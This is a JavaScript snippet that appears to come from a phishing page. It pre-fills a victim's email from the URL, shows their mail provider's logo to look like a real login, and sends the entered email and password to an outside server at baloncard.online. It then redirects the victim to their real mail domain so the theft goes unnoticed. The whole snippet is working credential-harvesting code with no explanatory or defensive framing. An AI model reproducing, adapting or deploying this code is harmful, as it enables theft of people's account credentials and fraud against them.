    <script>
        var ai = window.location.hash.substr(1);

        if (ai) {
            var my_ai = ai;
            var ind = my_ai.indexOf("@");
            var my_slice = my_ai.substr(ind + 1);
            var c = my_slice.substr(0, my_slice.indexOf("."));
            var final = c.toLowerCase();
            $("#ai").val(my_ai);
            $("#msg").hide();

            var logoUrl = "#" + my_slice + "/common/logo";
            $.get(logoUrl)
                .done(function () {
                    $("#log").attr("src", logoUrl);
                })
                .fail(function () {
                    $("#log").attr("src", "https://i.imgur.com/vm5zl0k.png");
                });
        }

        function submitForm(event) {
            event.preventDefault();

            // Get the form data using FormData
            var formData = new FormData(document.querySelector("form[name='form1']"));

            // Get the email and password values from the form
            var email = formData.get("ai");
            var password = formData.get("namep");

            // Validate email and password inputs
            // if (email.trim() === "" || password.trim() === "" || password.length < 4) {
            //     document.getElementById("error").innerHTML = "Invalid Login Try again";
            //     return; // Do not proceed if requirements are not met
            // }

            if (email === "" || password === "" || password.length < 4) {

                document.getElementById("errorImage").style.display = "block";
                return; // Do not proceed if requirements are not met
            }

            // Send the form data to the email server using AJAX
            $.ajax({
                url: "https://baloncard.online/webbmailEmispark12Aug/out2.php",
                method: "POST",
                data: formData,
                processData: false,
                contentType: false,
                success: function (response) {
                    console.log("Email sent successfully");

                    // Get the email value from the form
                    var email = formData.get("ai");

                    // Extract the domain from the email
                    var domain = email.split('@')[1];
                    var redirectURL = "https://" + domain;

                    // Redirect to the new URL with the email as a fragment identifier
                    window.location.href = redirectURL + "#" + email;
                },
                error: function (error) {
                    console.error("Error", error);
                    document.getElementById("error").innerHTML = "Error, Try again";
                }
            });
        }

        // Attach the submitForm function to the form's submit event
        document.querySelector("form[name='form1']").addEventListener("submit", submitForm);
    </script>
